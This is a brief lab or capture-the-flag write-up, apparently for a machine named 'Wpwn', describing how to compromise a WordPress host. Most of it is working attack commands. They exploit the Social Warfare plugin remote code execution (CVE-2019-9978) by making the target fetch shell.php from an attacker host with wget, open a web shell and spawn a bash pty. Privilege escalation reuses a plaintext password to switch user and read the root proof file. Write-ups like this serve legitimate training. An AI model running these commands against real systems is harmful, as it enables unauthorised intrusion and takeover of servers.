# Wpwn

**IP Address:** 192.168.178.123

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 22    | ssh      | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |
| 80    | http     | Apache httpd 2.4.38 ((Debian)) |

## Exploitation
### Exploit Details (wpscan)
* **Name** - Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
* **CVE** - 2019-9978
* **Module** - N/A
* **Disclosed** - 2019-03-25 
* **References**
  * https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618

Commands
```bash
echo "<pre>system('wget http://192.168.49.178/shell.php')</pre>" > /root/share/payload.txt
curl "http://$ip/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$lhost/payload.txt"
curl "http://$ip/wordpress/wp-admin/shell.php"
python -c 'import pty;pty.spawn("/bin/bash")'

whoami
cat /var/www/local.txt
```
![Execute Exploit](images/exploit1.png)

## Privilege Escalation
### Exploit Details (Password reuse)
* **Name** - Password reuse
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Commands
```bash
su takis
R3&]vzhHmMn9,:-5
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)
